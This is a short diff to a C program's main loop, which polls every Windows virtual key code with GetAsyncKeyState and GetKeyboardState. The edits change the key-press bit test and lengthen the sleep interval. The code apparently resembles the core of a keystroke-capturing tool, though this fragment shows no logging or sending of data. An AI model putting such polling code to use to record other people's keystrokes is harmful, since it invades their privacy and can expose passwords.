@@ -22,7 +22,7 @@ int main()
         {
             for (int vk = 0x08; vk <= 0xFE; vk++)
             {
-                if (GetAsyncKeyState(vk) & 0x8000)
+                if (GetAsyncKeyState(vk) & 0x0001)
                 {
                     BYTE keyboardState[256];
                     GetKeyboardState(keyboardState);
@@ -76,7 +76,7 @@ int main()
                     }
                 }
             }
-            Sleep(10);
+            Sleep(90);
         }
     }
 
